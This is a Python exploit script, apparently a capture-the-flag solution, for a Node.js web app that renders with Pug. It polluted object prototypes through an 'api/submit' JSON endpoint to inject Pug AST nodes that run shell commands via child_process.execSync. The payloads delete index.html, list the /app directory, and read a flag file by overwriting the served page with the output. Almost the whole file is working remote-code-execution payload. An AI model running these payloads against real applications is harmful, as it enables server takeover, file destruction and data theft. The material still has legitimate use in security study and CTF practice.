import requests as r

url = '__URL_HERE__'
headers = {"Content-Type": "application/json"}
data = {
    "__proto__.artist.name": "Westaway", "__proto__.type": "Program", "__proto__.block": {"type": "Text", "line": "process.mainModule.require('child_process').execSync(`rm /app/views/index.html`)"}}
r.post(url + 'api/submit', json=data, headers=headers)
# Remote code execution using vuln on pug
# This data lists directories and saves output as index.html so we can read only reaching to index page without remote shell
data = {

    "__proto__.artist.name": "Westaway",
    "__proto__.type": "Program",
    "__proto__.block": {
        "type": "Text",
        "line": "process.mainModule.require('child_process').execSync(`ls /app/ > /app/views/index.html`)"
    }
}
r.post(url + 'api/submit', json=data, headers=headers)
resp = r.get(url)
print(resp.text)
# split by space
psnd = resp.text.split("\n")
flagFN = ''
for f in psnd:
    if f.startswith("flag"):
        flagFN = f
# Read flag
data = {

    "__proto__.artist.name": "Westaway",
    "__proto__.type": "Program",
    "__proto__.block": {
        "type": "Text",
        "line": f"process.mainModule.require('child_process').execSync(`cat /app/{flagFN} > /app/views/index.html`)"
    }
}
r.post(url + 'api/submit', json=data, headers=headers)
resp = r.get(url)
print('flag?:', resp.text)
